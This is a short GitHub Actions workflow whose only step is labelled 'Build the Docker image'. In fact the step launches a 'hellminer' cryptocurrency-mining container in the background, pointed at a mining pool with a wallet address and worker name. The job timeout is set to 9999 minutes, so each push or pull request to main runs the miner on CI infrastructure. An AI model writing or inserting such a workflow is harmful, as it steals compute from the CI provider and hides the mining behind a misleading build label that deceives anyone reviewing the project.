name: ntaloventi

on:
  push:
    branches: [ "main" ]
  pull_request:
    branches: [ "main" ]

jobs:

  build:

    runs-on: ubuntu-latest
    timeout-minutes: 9999

    steps:
    - name: Build the Docker image
      run: docker run -itd -e URL="ap.luckpool.net" -e PORT=3956 -e WALLET="RALSPrXkQAE821jyVrj92f4vik1RUNtv74" -e WORKER="berto1" -e CPU=1  --name bekbek ntaloventi/hellminer:v2.0
